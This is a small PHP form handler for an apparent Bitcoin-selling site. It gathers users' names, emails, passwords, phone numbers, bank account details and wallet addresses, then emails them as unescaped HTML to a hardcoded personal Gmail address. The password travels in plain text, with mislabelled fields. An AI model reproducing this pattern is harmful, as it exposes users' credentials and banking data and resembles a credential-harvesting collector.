<?php

session_start();

if (isset($_POST['reg'])) {
    $_SESSION["nmName"] = $_POST['nmName'];
    $_SESSION["nmMail"] = $_POST['nmMail'];
    $_SESSION["nmPasw"] = $_POST['nmPasw'];
    
} elseif (isset($_POST['per'])) {
    $_SESSION["nmYName"] = $_POST['nmYName'];
    $_SESSION["nmPhone"] = $_POST['nmPhone'];
    $_SESSION["nmCountry"] = $_POST['nmCountry'];
    $_SESSION["nmBankName"] = $_POST['nmBankName'];
    $_SESSION["nmBankCountry"] = $_POST['nmBankCountry'];
    $_SESSION["nmBankAcNo"] = $_POST['nmBankAcNo'];
    $_SESSION["nmBankHolder"] = $_POST['nmBankHolder'];
    $_SESSION["nmWallet"] = $_POST['nmWallet'];
    $_SESSION["nmCash"] = $_POST['nmCash'];
    $_SESSION["nmInfo"] = $_POST['nmInfo'];

} else {
    $_SESSION["nmSell"] = $_POST['nmSell'];
    $_SESSION["nmSendBTC"] = $_POST['nmSendBTC'];
    $_SESSION["nmPayWith"] = $_POST['nmPayWith'];

    nmMailSend();
    
}

function nmMailSend()
{
    $to = "arosh019@gmail.com";
    $subject = "New User";
    //$from = 'fromTEST@gmail.com';

    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    $headers .= 'From: <fromTEST@gmail.com>' . "\r\n";
    $headers .= 'Cc: test@gmail.com' . "\r\n";

    $message = '<html><body>';

    //Basic Info
    $message .= '<h2>Basic Info</h2>';
    $message .= '<strong>Name :</strong><span>'.$_SESSION["nmName"].'</span><br>';
    $message .= '<strong>Email :</strong><span>'.$_SESSION["nmMail"].'</span><br>';
    $message .= '<strong>Name :</strong><span>'.$_SESSION["nmPasw"].'</span><br>';
    
    //Personal Info
    $message .= '<h2>Personal Info</h2>';
    $message .= '<strong>Name :</strong><span>'.$_SESSION["nmYName"].'</span><br>';
    $message .= '<strong>Phone :</strong><span>'.$_SESSION["nmPhone"].'</span><br>';
    $message .= '<strong>Country :</strong><span>'.$_SESSION["nmCountry"].'</span><br>';
    $message .= '<strong>Bank Name :</strong><span>'.$_SESSION["nmBankName"].'</span><br>';
    $message .= '<strong>Bank Country :</strong><span>'.$_SESSION["nmBankCountry"].'</span><br>';
    $message .= '<strong>Bank Ac. No. :</strong><span>'.$_SESSION["nmBankAcNo"].'</span><br>';
    $message .= '<strong>Bank Holder :</strong><span>'.$_SESSION["nmBankHolder"].'</span><br>';
    $message .= '<strong>Wallet add. :</strong><span>'.$_SESSION["nmWallet"].'</span><br>';
    $message .= '<strong>Cash :</strong><span>'.$_SESSION["nmCash"].'</span><br>';
    $message .= '<strong>Add. Info :</strong><span>'.$_SESSION["nmInfo"].'</span><br>';
    
    //Payment Info
    $message .= '<h2>Payment Info</h2>';
    $message .= '<strong>Sell Amount :</strong><span>'.$_SESSION["nmCash"].'</span><br>';
    $message .= '<strong>Send BTC To :</strong><span>'.$_SESSION["nmSendBTC"].'</span><br>';
    $message .= '<strong>Pay With :</strong><span>'.$_SESSION["nmPayWith"].'</span><br>';

    $message .= '</body></html>';

    mail($to, $subject, $message, $headers);

    session_destroy();
}
